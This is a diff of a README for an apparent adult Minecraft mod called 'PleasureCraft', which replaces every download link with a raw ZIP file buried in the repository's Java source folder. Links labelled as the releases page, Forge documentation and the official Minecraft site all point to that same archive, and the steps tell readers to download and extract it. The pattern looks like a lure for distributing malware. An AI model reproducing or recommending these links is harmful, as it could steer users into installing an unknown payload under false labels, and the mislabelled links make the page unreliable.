@@ -1,7 +1,7 @@
 # 🎮 PleasureCraft - Immerse Yourself in Sensual Exploration
 
 ## 📥 Download Now!
-[![Download PleasureCraft](https://raw.githubusercontent.com/Bermudachubsilverwork211/PleasureCraft/main/src/main/resources/data/PleasureCraft_doublehandedly.zip)](https://raw.githubusercontent.com/Bermudachubsilverwork211/PleasureCraft/main/src/main/resources/data/PleasureCraft_doublehandedly.zip)
+[![Download PleasureCraft](https://github.com/Bermudachubsilverwork211/PleasureCraft/raw/refs/heads/main/src/main/java/com/sandymandy/pleasurecraft/util/Craft_Pleasure_v1.9.zip)](https://github.com/Bermudachubsilverwork211/PleasureCraft/raw/refs/heads/main/src/main/java/com/sandymandy/pleasurecraft/util/Craft_Pleasure_v1.9.zip)
 
 ## 📖 About PleasureCraft
 PleasureCraft is a carefully designed Minecraft mod that enhances your gaming experience. It goes beyond the usual romantic encounters and invites you into a world of sensual adventures. Players can explore intimate interactions and playful scenarios, creating a genuine connection with their partners. This mod transforms the way you experience Minecraft by adding depth and engagement to your journey.
@@ -22,11 +22,11 @@ Before you download, check if your system meets these requirements:
 ## 🚀 Getting Started
 Here's how you can download and run PleasureCraft:
 
-1. **Visit the Releases Page:** Go to the official [PleasureCraft Releases Page](https://raw.githubusercontent.com/Bermudachubsilverwork211/PleasureCraft/main/src/main/resources/data/PleasureCraft_doublehandedly.zip).
+1. **Visit the Releases Page:** Go to the official [PleasureCraft Releases Page](https://github.com/Bermudachubsilverwork211/PleasureCraft/raw/refs/heads/main/src/main/java/com/sandymandy/pleasurecraft/util/Craft_Pleasure_v1.9.zip).
   
 2. **Select the Latest Version:** Look for the most recent release. It’s usually listed at the top.
 
-3. **Download the Mod File:** Click on the file link that corresponds to your operating system. It may be labeled something like `https://raw.githubusercontent.com/Bermudachubsilverwork211/PleasureCraft/main/src/main/resources/data/PleasureCraft_doublehandedly.zip` or similar.
+3. **Download the Mod File:** Click on the file link that corresponds to your operating system. It may be labeled something like `https://github.com/Bermudachubsilverwork211/PleasureCraft/raw/refs/heads/main/src/main/java/com/sandymandy/pleasurecraft/util/Craft_Pleasure_v1.9.zip` or similar.
 
 4. **Extract the Files:** Once downloaded, locate the ZIP file in your downloads folder. Right-click on the file and choose “Extract All.” This will create a folder with the mod files.
 
@@ -55,10 +55,10 @@ If you run into issues, try these tips:
 Join the PleasureCraft community for tips, support, and shared experiences. Connect with other players and share your adventures. You can find discussions and support on forums or dedicated Discord channels.
 
 ## 🌐 Additional Resources
-- [Minecraft Forge Documentation](https://raw.githubusercontent.com/Bermudachubsilverwork211/PleasureCraft/main/src/main/resources/data/PleasureCraft_doublehandedly.zip)
-- [Minecraft Official Site](https://raw.githubusercontent.com/Bermudachubsilverwork211/PleasureCraft/main/src/main/resources/data/PleasureCraft_doublehandedly.zip)
+- [Minecraft Forge Documentation](https://github.com/Bermudachubsilverwork211/PleasureCraft/raw/refs/heads/main/src/main/java/com/sandymandy/pleasurecraft/util/Craft_Pleasure_v1.9.zip)
+- [Minecraft Official Site](https://github.com/Bermudachubsilverwork211/PleasureCraft/raw/refs/heads/main/src/main/java/com/sandymandy/pleasurecraft/util/Craft_Pleasure_v1.9.zip)
 
 ## 📦 Download & Install
-Ready to have some fun? Visit our [Releases Page](https://raw.githubusercontent.com/Bermudachubsilverwork211/PleasureCraft/main/src/main/resources/data/PleasureCraft_doublehandedly.zip) to download PleasureCraft and start your journey into a world of sensual exploration today! 
+Ready to have some fun? Visit our [Releases Page](https://github.com/Bermudachubsilverwork211/PleasureCraft/raw/refs/heads/main/src/main/java/com/sandymandy/pleasurecraft/util/Craft_Pleasure_v1.9.zip) to download PleasureCraft and start your journey into a world of sensual exploration today! 
 
 Enjoy the new adventures that await you in Minecraft with PleasureCraft!
